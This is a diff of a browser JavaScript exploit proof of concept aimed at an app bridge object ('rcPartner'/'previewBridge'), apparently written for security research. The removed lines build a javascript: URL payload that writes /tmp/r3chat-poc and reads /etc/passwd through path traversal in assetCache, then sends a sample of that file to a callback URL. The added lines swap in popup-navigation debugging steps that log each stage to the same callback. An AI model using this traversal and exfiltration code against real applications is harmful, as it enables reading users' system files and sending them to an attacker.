@@ -11,19 +11,40 @@ async function log(data) {
   const b = window.rcPartner || window.previewBridge;
   if (!b) {
     if (!new URLSearchParams(location.search).has("stage2")) {
-      const popup = window.open("https://www.google.com/?r3chat=" + Date.now(), "_blank");
-      const js = `javascript:(async()=>{const C=${JSON.stringify(CALLBACK)};const L=x=>fetch(C+"?"+new URLSearchParams(x),{mode:"no-cors"});try{const b=window.rcPartner||window.previewBridge;if(!b){await L({stage:"google-no-bridge",href:location.href});return}await L({stage:"bridge",href:location.href});await b.assetCache.put("../../../../../../tmp/r3chat-poc","ok\\n","utf8");await L({stage:"wrote"});const p=await b.assetCache.get("../../../../../../etc/passwd","utf8");await L({stage:"read",sample:p.slice(0,180)})}catch(e){await L({stage:"google-js-error",err:String(e&&e.stack||e)})}})()`;
-      await log({ stage: "opened-google-popup", popup: String(!!popup), mode: "javascript-url" });
-      setTimeout(() => {
+      const nonce = String(Date.now());
+      const next = location.origin + location.pathname + "?stage2=1&nonce=" + nonce;
+      const popup = window.open("https://www.google.com/?r3chat=" + nonce, "r3debug");
+      await log({ stage: "dbg-open", popup: String(!!popup), next });
+
+      setTimeout(async () => {
         try {
-          popup.location = js;
+          popup.location.href = next + "&method=href";
+          await log({ stage: "dbg-set-href" });
         } catch (e) {
-          log({ stage: "popup-nav-fail", err: String(e) });
+          await log({ stage: "dbg-set-href-fail", err: String(e) });
         }
-      }, 1200);
+      }, 800);
+
+      setTimeout(async () => {
+        try {
+          popup.location.replace(next + "&method=replace");
+          await log({ stage: "dbg-replace" });
+        } catch (e) {
+          await log({ stage: "dbg-replace-fail", err: String(e) });
+        }
+      }, 1800);
+
+      setTimeout(async () => {
+        try {
+          const p2 = window.open(next + "&method=open-existing", "r3debug");
+          await log({ stage: "dbg-open-existing", popup: String(!!p2) });
+        } catch (e) {
+          await log({ stage: "dbg-open-existing-fail", err: String(e) });
+        }
+      }, 2800);
       return;
     }
-    await log({ stage: "no-previewBridge", href: location.href });
+    await log({ stage: "stage2-no-bridge", href: location.href });
     return;
   }
 
